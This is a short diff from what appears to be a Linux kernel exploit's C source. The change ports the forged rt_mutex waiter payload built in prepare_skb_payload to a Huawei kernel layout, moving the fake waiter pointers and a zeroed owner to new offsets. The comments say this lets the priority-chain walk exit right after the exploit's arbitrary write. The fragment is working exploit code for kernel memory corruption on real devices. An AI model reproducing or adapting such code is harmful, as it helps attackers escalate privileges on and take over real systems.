@@ -593,9 +593,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
          on the overlaid W->task); owner = NULL makes rt_mutex_adjust_
          prio_chain return right after rt_mutex_dequeue performed the
          write.  See main.c overlay comment. */
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, 0);
+      /* HUAWEI rt_mutex layout (replica disasm): waiters.rb_root@0x18,
+         rb_leftmost@0x20, owner@0x28 (+8/+0x10 = kshield bookkeeping the
+         kernel writes itself). owner=0 -> walk exits right after the [7]
+         erase (our write) at the !owner check. */
+      put64(p, LOCK_OFF + 0x18, fake_w0);
+      put64(p, LOCK_OFF + 0x20, fake_w0);
+      put64(p, LOCK_OFF + 0x28, 0);
     }
 
     put64(p, W0_OFF + 0x00, 1);
